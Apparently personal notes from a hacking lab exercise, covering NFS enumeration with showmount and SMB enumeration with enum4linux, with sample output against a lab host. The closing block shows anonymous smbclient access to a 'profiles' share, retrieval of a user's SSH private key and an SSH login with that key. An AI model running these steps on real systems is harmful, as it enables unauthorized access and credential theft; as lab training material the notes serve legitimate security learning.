# nfs common

Offers Informations about NFS Share of the Target

```
/usr/sbin/showmount -e 10.10.128.227
```

nfs-common Tools:
 * lockd
 * statd
 * showmount
 * nfsstat, gssd
 * idmapd
 * mount.nfs


# Enum4Linux

=> wrapper Around Samba Package, Offers Informations about SMB

Usage:

`enum4linux [options] ip`

* -U = userlist
* -M = Machinelist
* -N = Namelist dump
* -S = Sharelist
* -P = Password Policy
* -G = groups/member
* -a = all


Example:

```
enum4linux -A 10.10.149.209
        


         ========================== 
        |    Target Information    |
         ========================== 
        Target ........... 10.10.149.209
        RID Range ........ 500-550,1000-1050
        Username ......... ''
        Password ......... ''
        Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
        
        
         ========================================== 
        |    Share Enumeration on 10.10.149.209    |
         ========================================== 
        WARNING: The "syslog" option is deprecated
        
        	Sharename       Type      Comment
        	---------       ----      -------
        	netlogon        Disk      Network Logon Service
        	profiles        Disk      Users profiles
        	print$          Disk      Printer Drivers
        	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
        Reconnecting with SMB1 for workgroup listing.
        
        	Server               Comment
        	---------            -------
        
        	Workgroup            Master
        	---------            -------
        	WORKGROUP            POLOSMB
        
        [+] Attempting to map shares on 10.10.149.209
        //10.10.149.209/netlogon	[E] Can't understand response:
        WARNING: The "syslog" option is deprecated
        tree connect failed: NT_STATUS_BAD_NETWORK_NAME
        //10.10.149.209/profiles	Mapping: OK, Listing: OK
        //10.10.149.209/print$	Mapping: DENIED, Listing: N/A
        //10.10.149.209/IPC$	[E] Can't understand response:
        WARNING: The "syslog" option is deprecated
        NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
        
         ======================================================================== 
        |    Users on 10.10.149.209 via RID cycling (RIDS: 500-550,1000-1050)    |
         ======================================================================== 
        [I] Found new SID: S-1-22-1
        [I] Found new SID: S-1-5-21-434125608-3964652802-3194254534
        [I] Found new SID: S-1-5-32
        [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
        S-1-22-1-1000 Unix User\cactus (Local User)
        [+] Enumerating users using SID S-1-5-32 and logon username '', password ''
        ...



smbclient //10.10.149.209/profiles -u Anonymous -p 445
get "Working from Home Information.txt" test.txt
cd .ssh
get id_rsa id_rsa
get id_rsa.pub id_rsa.pub
vi id_rsa.pub
ssh -i id_rsa cactus@10.10.149.209
```
